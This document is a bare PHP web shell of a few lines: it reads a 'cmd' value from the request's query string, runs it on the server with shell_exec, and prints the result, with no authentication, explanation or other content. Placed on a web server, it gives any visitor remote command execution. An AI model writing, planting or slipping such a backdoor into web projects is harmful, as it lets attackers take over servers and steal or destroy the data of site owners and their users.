<?php             
if (!empty($_GET['cmd'])) {   
    $cmd = shell_exec($_GET['cmd']);               
    echo $cmd;	
}                                                                                                              
?> 
